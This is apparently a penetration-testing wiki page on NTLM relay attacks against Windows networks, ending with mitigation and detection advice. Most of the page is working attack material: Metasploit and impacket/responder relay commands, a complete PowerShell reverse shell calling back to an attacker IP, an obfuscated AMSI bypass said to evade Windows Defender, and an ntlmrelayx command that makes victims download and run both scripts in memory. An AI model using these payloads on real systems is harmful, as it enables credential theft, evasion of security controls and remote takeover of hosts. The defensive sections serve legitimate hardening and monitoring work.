# NTLM Relay

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}

{% hint style="info" %}
#### For a full list of MitM techniques refer to[ MitM & poisoning](../../../network-attacks/network-poisoning-mitm/) section.
{% endhint %}

## <mark style="color:red;">RDP MitM</mark>

#### refer to[ this section](../../../network-attacks/network-poisoning-mitm/rdp-downgrade.md) .

## <mark style="color:red;">MS08-068</mark>

{% embed url="https://www.rapid7.com/blog/post/2008/11/11/ms08-068-metasploit-and-smb-relay" %}

{% embed url="https://msrc-blog.microsoft.com/2008/11/11/ms08-068-smb-credential-reflection-defense" %}

### <mark style="color:orange;">Metasploit Module</mark>

```
use exploit/windows/smb/smb_relay 
# windows2000 / windows server2008
```

## <mark style="color:red;">NTLM Relay</mark>

```
impacket-ntlmrelayx -tf targets.txt -wh hacker-wpad --delegate-access -smb2support --remove-mic
responder -I vboxnet0 --lm -v -P -F -w -d -b
```

## <mark style="color:red;">NTLM Relay + Empire</mark>

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}

{% embed url="https://youtu.be/f9oMVoc2Umc" %}

## <mark style="color:red;">NTLM Relay + AMSI Bypass</mark>

{% hint style="info" %}
Combining NTLM relay with empire one-liners is not effective in a modern Active Directory Environment with latest windows security updates because AMSI has evolved and the payload is easily detected and blocked.
{% endhint %}

This technique will use the same principles of NTLM relay but with a simple trick to bypass AMSI and get a reverse shell, the AMSI  bypass script and reverse shell payload can be different but the one i am using here could bypass windows 10  pro update 1/20/2020 with windows defender and AMSI enabled.

#### <mark style="color:green;">find hosts with smb signing disabled:</mark>

```
crackmapexec smb 192.168.56.1/24 --gen-relay-list targets
```

#### <mark style="color:green;">simple powershell TCP reverse shell payload (catch with netcat or metasploit multi/handler):</mark>

{% code title="rev.ps1" %}
```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```
{% endcode %}

#### <mark style="color:green;">AMSI bypass payload (try using other payloads if this doesn't work):</mark>

{% code title="bypass.ps1" %}
```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

#### <mark style="color:green;">run a python http server to serve these files:</mark>

```
python3 -m http.server 9000
```

#### <mark style="color:green;">run responder and ntlmrelayx with a powershell command to load the scripts in memory and execute them in the same powershell session (otherwise the bypass wont work):</mark>

```
 responder -I vboxnet0 -dw
 
 impacket-ntlmrelayx  --delegate-access -smb2support -tf targets -c "powershell -ep bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1:9000/bypass.ps1');IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1:9000/rev.ps1')"
```

now when responder gets new hashes, ntlmrelayx will relay them and if the login was successful, power powershell command will load bypass and reverse shell scripts in memory and execute both og them to bypass AMSI and we get a shell.

## <mark style="color:red;">Mitigation</mark>

* Enforce SM signing - turn on SMB Signing on all machines in the network.
* Block NTLMNv1- NTLMv1 is considered significantly less secure than its more recent version, the NTLMNv2.
* Enforce LDAP/S Signing- to prevent NTLM relay in LDAP, enforce LDAP signing and LDAPS channel binding on domain controllers.
* Enforce EPA- to prevent NTLM relay on web servers, harden them to accept only requests with EPA.
* _**Reduce NTLM usage-**_ even after all measures were taken. The best thing you can do is to simply reduce the NTLM usage. As NTLM poses a significant risk, it is recommended that you remove it where it is not needed.

{% hint style="success" %}
The only way to be totally safe from SMB/NTLM relay attacks is to completely disable NTLM authentication and  switch to Kerberos.

This might not always be possible as a lot of old services and applications have some issues with Kerberos.&#x20;
{% endhint %}

## <mark style="color:red;">Detection</mark>

* Get all NTLM logons where the session has admin privileges
* Get all hostnames and their IPs using one of the methods above
* Use left anti join to find logons where the **Network Address** in the NTLM logon event doesn’t match the IP of the host in step 2.

### <mark style="color:orange;">False Positive/Negative Considerations</mark> <a href="#1c97" id="1c97"></a>

* If you have load balancers or other devices that perform SNAT, authentications coming over these devices will be seen as relayed. These IPs need to be whitelisted. There is a false positive and false negative risk in this case.
* Devices that are not joined to a domain always perform NTLM authentication. Baselining with historical logon events will reduce false positives. Alternatively, hostname and IP address info can be obtained and whitelisted manually.
* NTLM relaying of machine accounts can’t be detected using the above logic if the machine logon events are used as the single source of truth for hostname — IP pair. This is a rare scenario but it might be critical like in the PetitPotam case. Critical computer accounts can be monitored using the same logic and using a manually created hostname-IP list. Since the attack surface most likely is the servers, DNS records might be a good option.
* Sometimes, the **Workstation Name/Network Address** doesn’t appear in the logs.

### <mark style="color:orange;">Bonus detection</mark> <a href="#429b" id="429b"></a>

The detection logic can also find devices that stopped sending events since the logic performs a logical NOT operation.
